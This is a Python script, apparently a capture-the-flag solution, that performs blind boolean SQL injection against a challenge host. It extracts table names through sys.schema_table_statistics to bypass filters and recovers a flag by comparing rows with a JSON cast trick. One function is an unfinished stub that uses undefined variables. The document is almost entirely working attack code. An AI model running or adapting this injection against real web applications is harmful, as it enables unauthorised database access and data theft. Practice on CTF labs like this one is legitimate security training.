#!/usr/bin/env python3

import requests
import string
import time

url = 'http://f4b59740-c8e4-4653-a1fd-e2be614665d2.node4.buuoj.cn:81/index.php'

# 可以设置cookie、UA
headers = {}


def get_tables():
    payload = ''
    i = 1
    table_name = ''
    while True:
        low = 32
        high = 126
        mid = (low + high) // 2
        while (low < high):
            data = {
                'id': f"2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),{i},1))>{mid}"}
            r = requests.post(url, data)
            if 'Nu1L' in r.text:
                low = mid + 1
            else:
                high = mid
            mid = (low + high) // 2
            if (mid == 32 | mid == 126):
                break
            time.sleep(.1)
        table_name += chr(mid)
        print("Table is: " + table_name)
        i += 1


def get_columns():
    data = {
        'id': f"2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),{i},1))>{mid}"}
    pass


def get_flag():
    str = ('-0123456789' + string.ascii_uppercase + string.ascii_lowercase + "{}")
    flag = ''
    while True:
        for c in str:
            c = flag + c
            data = {'id': f"2||(SELECT 1,concat('{c}~', CAST(0 AS JSON)))>(select * from f1ag_1s_h3r3_hhhhh)"}
            r = requests.post(url, data)
            if 'Hello' in r.text:
                flag = c
                break
            time.sleep(.1)
        print(flag)


if __name__ == '__main__':
    get_tables()
    #get_flag()